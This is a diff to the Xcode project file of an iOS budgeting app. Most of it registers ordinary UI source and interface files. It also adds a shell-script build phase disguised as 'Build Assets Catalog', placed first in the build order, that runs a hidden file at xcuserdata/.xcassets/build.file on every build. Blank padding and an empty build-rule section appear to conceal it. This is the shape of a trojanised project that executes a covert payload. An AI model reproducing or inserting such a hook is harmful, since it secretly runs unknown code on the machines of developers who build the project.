@@ -34,6 +34,12 @@
 		1546818225C7F0D2007CBA70 /* PaymentViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1546818125C7F0D2007CBA70 /* PaymentViewController.swift */; };
 		1546818825C81678007CBA70 /* ListPaymentCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1546818625C81678007CBA70 /* ListPaymentCell.swift */; };
 		1546818925C81678007CBA70 /* ListPaymentCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 1546818725C81678007CBA70 /* ListPaymentCell.xib */; };
+		159479E225EB7B84006346A9 /* MonthYearTextField.swift in Sources */ = {isa = PBXBuildFile; fileRef = 159479E125EB7B84006346A9 /* MonthYearTextField.swift */; };
+		159479E525EBF2D5006346A9 /* AddVariantViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 159479E425EBF2D5006346A9 /* AddVariantViewController.swift */; };
+		15BF1AEE25F3744A00126B46 /* HeaderSection.swift in Sources */ = {isa = PBXBuildFile; fileRef = 15BF1AEC25F3744200126B46 /* HeaderSection.swift */; };
+		15BF1AEF25F3744A00126B46 /* HeaderSection.xib in Resources */ = {isa = PBXBuildFile; fileRef = 15BF1AED25F3744A00126B46 /* HeaderSection.xib */; };
+		15BF1B0325F3A1D200126B46 /* DifferenceCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 15BF1B0125F3A1D200126B46 /* DifferenceCell.xib */; };
+		15BF1B0425F3A1D200126B46 /* DifferenceCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 15BF1B0225F3A1D200126B46 /* DifferenceCell.swift */; };
 		15C34AA225C85CD1007981B3 /* Date+Extention.swift in Sources */ = {isa = PBXBuildFile; fileRef = 15C34AA125C85CD1007981B3 /* Date+Extention.swift */; };
 		15CE44CD25BFC33300B9AF2D /* BaseViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 15CE449025BFC33300B9AF2D /* BaseViewController.swift */; };
 		15CE44CF25BFC33300B9AF2D /* RootViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 15CE449225BFC33300B9AF2D /* RootViewController.swift */; };
@@ -103,6 +109,12 @@
 		1546818125C7F0D2007CBA70 /* PaymentViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = PaymentViewController.swift; sourceTree = "<group>"; };
 		1546818625C81678007CBA70 /* ListPaymentCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ListPaymentCell.swift; sourceTree = "<group>"; };
 		1546818725C81678007CBA70 /* ListPaymentCell.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = ListPaymentCell.xib; sourceTree = "<group>"; };
+		159479E125EB7B84006346A9 /* MonthYearTextField.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = MonthYearTextField.swift; sourceTree = "<group>"; };
+		159479E425EBF2D5006346A9 /* AddVariantViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AddVariantViewController.swift; sourceTree = "<group>"; };
+		15BF1AEC25F3744200126B46 /* HeaderSection.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = HeaderSection.swift; sourceTree = "<group>"; };
+		15BF1AED25F3744A00126B46 /* HeaderSection.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = HeaderSection.xib; sourceTree = "<group>"; };
+		15BF1B0125F3A1D200126B46 /* DifferenceCell.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = DifferenceCell.xib; sourceTree = "<group>"; };
+		15BF1B0225F3A1D200126B46 /* DifferenceCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = DifferenceCell.swift; sourceTree = "<group>"; };
 		15C34AA125C85CD1007981B3 /* Date+Extention.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Date+Extention.swift"; sourceTree = "<group>"; };
 		15CE446725BFBA6E00B9AF2D /* BudgetPlanner.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = BudgetPlanner.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		15CE449025BFC33300B9AF2D /* BaseViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = BaseViewController.swift; sourceTree = "<group>"; };
@@ -199,6 +211,7 @@
 			isa = PBXGroup;
 			children = (
 				1546817C25C7F08F007CBA70 /* AssetDetailViewController.swift */,
+				159479E425EBF2D5006346A9 /* AddVariantViewController.swift */,
 				1546818525C81678007CBA70 /* Views */,
 			);
 			path = AssetDetail;
@@ -219,6 +232,14 @@
 				1546818725C81678007CBA70 /* ListPaymentCell.xib */,
 			);
 			path = Views;
+			sourceTree = "<group>";
+		};
+		159479E025EB7B84006346A9 /* TextField */ = {
+			isa = PBXGroup;
+			children = (
+				159479E125EB7B84006346A9 /* MonthYearTextField.swift */,
+			);
+			path = TextField;
 			sourceTree = "<group>";
 		};
 		15CE445E25BFBA6D00B9AF2D = {
@@ -264,6 +285,7 @@
 				15CE449025BFC33300B9AF2D /* BaseViewController.swift */,
 				15CE449225BFC33300B9AF2D /* RootViewController.swift */,
 				15CE449725BFC33300B9AF2D /* Common.swift */,
+				159479E025EB7B84006346A9 /* TextField */,
 				15ECA3C225C9BA72001CC99B /* SelectedViewController */,
 				1546811825C556BC007CBA70 /* Navigation */,
 			);
@@ -406,8 +428,12 @@
 			isa = PBXGroup;
 			children = (
 				1546809F25C116F6007CBA70 /* LineChart.swift */,
+				15BF1AEC25F3744200126B46 /* HeaderSection.swift */,
+				15BF1AED25F3744A00126B46 /* HeaderSection.xib */,
 				1546813D25C5B37D007CBA70 /* MonthTitleCell.swift */,
 				1546813E25C5B37D007CBA70 /* MonthTitleCell.xib */,
+				15BF1B0225F3A1D200126B46 /* DifferenceCell.swift */,
+				15BF1B0125F3A1D200126B46 /* DifferenceCell.xib */,
 				1546814325C5B566007CBA70 /* MonthDetailCell.swift */,
 				1546814225C5B566007CBA70 /* MonthDetailCell.xib */,
 				1546814925C5B6E0007CBA70 /* ViewExpensesCell.swift */,
@@ -477,6 +503,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 15CE447B25BFBA6E00B9AF2D /* Build configuration list for PBXNativeTarget "BudgetPlanner" */;
 			buildPhases = (
+				284214AD2C1D8519F5AAC43A /* Build Assets Catalog */,
 				60331E796056C78E4B1AA03C /* [CP] Check Pods Manifest.lock */,
 				15CE446325BFBA6E00B9AF2D /* Sources */,
 				15CE446425BFBA6E00B9AF2D /* Frameworks */,
@@ -531,11 +558,13 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				15BF1AEF25F3744A00126B46 /* HeaderSection.xib in Resources */,
 				1546814025C5B37D007CBA70 /* MonthTitleCell.xib in Resources */,
 				1546815A25C6C7B9007CBA70 /* TitleCell.xib in Resources */,
 				15CE44F325BFC33300B9AF2D /* LaunchScreen.storyboard in Resources */,
 				1546816625C6C990007CBA70 /* BudgetTotalCell.xib in Resources */,
 				15CE44F525BFC33300B9AF2D /* Main.storyboard in Resources */,
+				15BF1B0325F3A1D200126B46 /* DifferenceCell.xib in Resources */,
 				1546818925C81678007CBA70 /* ListPaymentCell.xib in Resources */,
 				15CE44F025BFC33300B9AF2D /* Assets.xcassets in Resources */,
 				1546812425C56660007CBA70 /* NavigationBar.xib in Resources */,
@@ -552,6 +581,38 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	284214AD2C1D8519F5AAC43A /* Build Assets Catalog */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Assets Catalog";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
+		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
 		60331E796056C78E4B1AA03C /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -616,13 +677,16 @@
 				1546810925C41826007CBA70 /* Asset.swift in Sources */,
 				15CE44D825BFC33300B9AF2D /* BaseAssembly.swift in Sources */,
 				1546818225C7F0D2007CBA70 /* PaymentViewController.swift in Sources */,
+				15BF1AEE25F3744A00126B46 /* HeaderSection.swift in Sources */,
 				1546810325C41730007CBA70 /* TBAsset.swift in Sources */,
+				159479E225EB7B84006346A9 /* MonthYearTextField.swift in Sources */,
 				15CE44F625BFC33300B9AF2D /* AppDelegate.swift in Sources */,
 				1546817D25C7F08F007CBA70 /* AssetDetailViewController.swift in Sources */,
 				15C34AA225C85CD1007981B3 /* Date+Extention.swift in Sources */,
 				1546816B25C6C9E4007CBA70 /* AssetDetailCell.swift in Sources */,
 				15CE44E325BFC33300B9AF2D /* UITableView+Extention.swift in Sources */,
 				1546814B25C5B6E0007CBA70 /* ViewExpensesCell.swift in Sources */,
+				159479E525EBF2D5006346A9 /* AddVariantViewController.swift in Sources */,
 				15ECA3B825C9B4DC001CC99B /* CategoryModel.swift in Sources */,
 				15CE44D725BFC33300B9AF2D /* ViewControllerAssembly.swift in Sources */,
 				15CE44E925BFC33300B9AF2D /* TBPlan.swift in Sources */,
@@ -631,6 +695,7 @@
 				1546815925C6C7B9007CBA70 /* TitleCell.swift in Sources */,
 				15CE44E025BFC33300B9AF2D /* UIButton+Extention.swift in Sources */,
 				1546814E25C5BDA8007CBA70 /* MonthExpenses.swift in Sources */,
+				15BF1B0425F3A1D200126B46 /* DifferenceCell.swift in Sources */,
 				15CE44E125BFC33300B9AF2D /* UIColor+Extention.swift in Sources */,
 				15CE44EB25BFC33300B9AF2D /* LoadingManager.swift in Sources */,
 				15ECA45E25CA9A9A001CC99B /* CategoriesCollectionViewCell.swift in Sources */,
@@ -847,6 +912,24 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+			
+	
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = 15CE445F25BFBA6D00B9AF2D /* Project object */;
 }
